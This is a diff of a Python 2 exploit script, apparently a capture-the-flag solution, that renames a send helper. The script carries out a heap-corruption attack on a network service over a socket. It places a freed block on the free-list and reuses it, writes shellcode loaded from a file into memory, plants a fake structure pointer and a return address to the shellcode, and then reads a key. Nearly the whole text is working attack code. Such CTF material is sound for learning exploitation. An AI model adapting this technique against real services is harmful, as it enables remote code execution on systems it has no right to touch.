@@ -100,28 +100,25 @@ if remote:
 	print 'response = {}'.format(result)
 	s.send(result)
 
-def go(s,payload,recvLen=-1):
+def send_cmd(s,payload,recvLen=0):
 	calc_chksum = chksum(payload)
 	payload += pack('H', chksum(payload))
 	s.send(payload)
-	if recvLen >= 0:
-		return recv_all(s, recvLen)
-	else:
-		return recv_availl(s, 5)
+	return recv_all(s, recvLen)
 
 shellcode = open('shellcode', 'rb').read()
 
 print 'Getting block into free-list'
-go(s,add_officer(1),5)
-go(s,remove_officer(1),5)
+send_cmd(s,add_officer(1),5)
+send_cmd(s,remove_officer(1),5)
 print 'Adding officer to reuse block from free-list'
-go(s,add_officer(0xc),5)
+send_cmd(s,add_officer(0xc),5)
 print 'Writing shellcode to 008f:0000'
-go(s,add_scene(1, pack("<HHHHHH", 0xc, 0, 0x4688, 0x8f, 0, 0), shellcode),5)
+send_cmd(s,add_scene(1, pack("<HHHHHH", 0xc, 0, 0x4688, 0x8f, 0, 0), shellcode),5)
 print 'Modifying officer structure to include pointer to fake officer on stack'
-go(s,add_scene(2, pack("<HHHHHH", 1, 0, 0, 0, 0x47aa, 0x011f), "lolololol"),5)
+send_cmd(s,add_scene(2, pack("<HHHHHH", 1, 0, 0, 0, 0x47aa, 0x011f), "lolololol"),5)
 print 'Writing return to shellcode on stack'
-go(s,add_officer(0x945, 0x1d26, 0x10, 0x97),5)
+send_cmd(s,add_officer(0x945, 0x1d26, 0x10, 0x97),5)
 
 print 'Receiving response...'
 print 'Key 1:', recv_until(s,'\n').replace('\x00', '')[:-1]
